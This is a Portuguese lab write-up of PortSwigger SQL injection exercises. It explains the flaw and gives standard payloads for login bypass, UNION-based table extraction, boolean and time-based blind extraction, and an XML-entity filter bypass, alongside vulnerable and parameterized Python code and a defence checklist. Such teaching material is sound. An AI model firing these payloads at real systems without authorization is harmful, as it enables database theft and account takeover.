# 💉 SQL Injection – PortSwigger Web Security Academy

## 📋 Informações Gerais

| Item | Detalhe |
|------|----------|
| **Plataforma** | PortSwigger Web Security Academy |
| **Categoria** | Injeção de Código |
| **Nível de Dificuldade** | Apprentice |
| **Status** | ✅ 9/9 Laboratórios Concluídos |
| **Data** | Maio-Junho 2026 |
| **Ferramentas** | Burp Suite, Hackvertor |

---

## 🎯 Objetivo do Laboratório

Dominar técnicas de exploração de SQL Injection (SQLi), desde casos simples com UNION SELECT até ataques avançados em XML/JSON, com foco em enumeração de banco de dados, bypass de autenticação e extração de dados sensíveis.

---

## 📖 Resumo Executivo

SQL Injection é uma vulnerabilidade fundamental onde entrada do usuário é concatenada diretamente em queries SQL sem sanitização. Exploração bem-sucedida permite:
1. **Bypass de autenticação** — login sem credenciais válidas
2. **Extração de dados** — leitura de tabelas inteiras
3. **Modificação de dados** — UPDATE/DELETE não autorizado
4. **Execução de comandos** — em alguns SGBDs

Todos os 9 labs foram explorados manualmente com compreensão profunda da lógica SQL.

---

## 📚 Conceitos Teóricos

### O que é SQL Injection?

Ocorre quando uma aplicação constrói queries SQL concatenando entrada do usuário:

```python
# ❌ VULNERÁVEL
username = request.args.get('user')
query = f"SELECT * FROM users WHERE username = '{username}'"
db.execute(query)  # Atacante controla a query!
```

Um atacante com entrada `admin' --` muda a query para:
```sql
SELECT * FROM users WHERE username = 'admin' --'
-- O "--" comenta o resto, contornando verificação de senha
```

### Por que acontece?

- Falta de validação e sanitização de entrada
- Concatenação direta em queries SQL
- Confusão entre dados e código SQL
- Desenvolvimento sem conscientização de segurança
- Falta de testes de segurança

### Qual é o impacto?

- **Crítico**: Acesso completo ao banco de dados
- Roubo de dados confidenciais
- Modificação ou exclusão de dados
- Possível execução de comandos no sistema
- Conformidade regulatória (GDPR, PCI DSS)

---

## 🧪 Técnicas Exploradas

### 1. Authentication Bypass

**Conceito**: Exploração de login vulnerável usando comentários SQL.

```sql
-- Payload
administrator'--

-- Query original
SELECT * FROM users WHERE username = 'administrator' AND password = 'anything'

-- Se "--" é comentário, password não é verificada:
SELECT * FROM users WHERE username = 'administrator' --' AND password = 'anything'
```

**Impacto**: Login sem credenciais válidas.

---

### 2. UNION SELECT Attacks

**Conceito**: Combinar resultados de queries para extrair dados de outras tabelas.

**Passo 1 - Descobrir número de colunas**:
```sql
' ORDER BY 3 --  -- Se 3 colunas, sucesso; se 4+, erro
' ORDER BY 4 --  -- Erro = max 3 colunas
```

**Passo 2 - Identificar tipo de dados**:
```sql
' UNION SELECT NULL, NULL, NULL --
' UNION SELECT 'string', NULL, NULL --  
' UNION SELECT 1, 2, 3 --
```

**Passo 3 - Extrair dados**:
```sql
' UNION SELECT username, password, version() FROM users --
```

**Impacto**: Extração de dados de qualquer tabela do banco.

---

### 3. Blind SQL Injection - Boolean-Based

**Conceito**: Quando não há retorno de dados, usar diferenças de comportamento.

```sql
TrackingId=abc' AND '1'='1  -- Aplicação retorna "Welcome back"
TrackingId=abc' AND '1'='2  -- Aplicação retorna "Page not found"

-- Extrair caractere por caractere
TrackingId=abc' AND SUBSTRING(password, 1, 1) = 'a' --
```

**Impacto**: Extração de dados mesmo sem retorno visível.

---

### 4. Blind SQL Injection - Time-Based

**Conceito**: Usar delays para inferir informações.

```sql
TrackingId=abc' AND IF(1=1, SLEEP(5), 0) --
-- Se delay de 5 segundos, condição foi verdadeira

TrackingId=abc' AND IF(SUBSTRING(password, 1, 1) = 's', SLEEP(5), 0) --
```

**Impacto**: Extração lenta mas confiável de dados.

---

### 5. WAF Bypass em XML

**Conceito**: Usar entidades XML para contornar filtros.

```xml
<!-- Payload normal bloqueado -->
<foo>SELECT</foo>  <!-- WAF bloqueia "SELECT" -->

<!-- Bypass com encoding hexadecimal -->
<foo>&#x53;ELECT</foo>  <!-- Decodifica para SELECT -->
```

**Impacto**: Contornar proteções WAF/IDS.

---

## 💥 Impacto Técnico

| Aspecto | Risco | Justificativa |
|---------|-------|---------------|
| **Confidencialidade** | 🔴 Alto | Acesso a toda base de dados |
| **Integridade** | 🔴 Alto | Modificação/exclusão de dados |
| **Disponibilidade** | 🟡 Médio | Possível DoS via queries pesadas |
| **Privilégios Necessários** | Verde | Nenhum (ataque anônimo) |
| **Tipo de Ataque** | Ativo | Requer envio de payloads |

---

## 🛡️ Mitigação & Defesa

### ❌ Implementação Vulnerável

```python
# ERRADO - Concatenação direta
username = request.args.get('username')
password = request.args.get('password')
query = f"SELECT * FROM users WHERE username = '{username}' AND password = '{password}'"
result = db.execute(query)
```

**Problema**: Atacante controla a query completamente.

---

### ✅ Implementação Segura

```python
# CORRETO - Prepared Statements (Parametrized Queries)
username = request.args.get('username')
password = request.args.get('password')

# 🟢 O SQL está separado dos dados
query = "SELECT * FROM users WHERE username = ? AND password = ?"
result = db.execute(query, (username, password))

# Ou com named parameters:
query = "SELECT * FROM users WHERE username = :user AND password = :pwd"
result = db.execute(query, {"user": username, "pwd": password})
```

**Explicação**:
- `?` ou `:user` são placeholders
- Dados são enviados **separadamente** da query
- Driver do banco automaticamente escapa caracteres especiais
- Impossível injetar SQL

---

### Princípios de Defesa

- [x] **Prepared Statements** — sempre usar placeholders
- [x] **Input Validation** — whitelist de valores permitidos
- [x] **Principle of Least Privilege** — conta BD com permissões mínimas
- [x] **ORM (Object-Relational Mapping)** — abstraem SQL
- [x] **WAF/IDS** — detectar tentativas comuns (defesa em profundidade)
- [x] **Logging** — auditar todas as queries SQL
- [x] **Error Handling** — nunca expor detalhes de banco em erros
- [x] **Regular Security Testing** — pentests, SAST, DAST

---

## 🎓 Lições Aprendidas

### Insight 1: Dados ≠ Código
Sempre tratar entrada do usuário como **dados**, nunca como **código SQL**. Prepared statements forçam essa separação.

### Insight 2: "Cego" Não Significa "Seguro"
Ainda que a aplicação não retorne dados SQL, um atacante pode extrair informações via:
- Diferenças de tempo
- Erros genéricos vs específicos
- Comportamento condicional

### Insight 3: Encoding Não É Suficiente
WAF bypass com entidades XML prova que apenas escapar caracteres não é defesa. Prepared statements são obrigatórios.

### Insight 4: Enumeração é Tudo
Uma vez dentro do BD:
1. Descobrir nome de tabelas (information_schema)
2. Descobrir colunas
3. Extrair dados

Sempre testar `UNION SELECT NULL` para estrutura de resposta.

### Aplicação em Bug Bounty

Ao testar SQLi em campo real:
1. **Reconhecimento**: Identificar campos que interagem com BD
2. **Teste básico**: `' OR '1'='1` para verificar vulnerabilidade
3. **Determinar BD**: `SELECT @@version` (MySQL), `SELECT version()` (PostgreSQL)
4. **Escalação**: `UNION SELECT` para dados sensíveis
5. **Automatização**: SQLmap para velocidade
6. **Documentação**: POC claro com impacto explícito

---

## 🔗 Referências Completas

- **OWASP**: [SQL Injection](https://owasp.org/www-community/attacks/SQL_Injection)
- **OWASP**: [Testing for SQL Injection](https://owasp.org/www-project-web-security-testing-guide/latest/4-Web_Application_Security_Testing/07-Input_Validation_Testing/05-Testing_for_SQL_Injection.html)
- **CWE**: [CWE-89 - Improper Neutralization of Special Elements used in an SQL Command](https://cwe.mitre.org/data/definitions/89.html)
- **PortSwigger**: [SQL Injection](https://portswigger.net/web-security/sql-injection)
- **HackTricks**: [SQL Injection](https://book.hacktricks.xyz/pentesting-web/sql-injection)
- **PayloadAllTheThings**: [SQL Injection Payloads](https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/SQL%20Injection)

---

## ⏱️ Tempo Total

- **Reconhecimento**: 15 min
- **Análise**: 30 min
- **Exploração**: 45 min
- **Validação**: 20 min
- **Documentação**: 30 min
- **Total**: ~2.5 horas para 9 labs

---

**Autor**: Aislan Silva  
**Data de Conclusão**: Junho 2026  
**Status**: ✅ Documentado  
**Qualidade**: ⭐⭐⭐⭐⭐
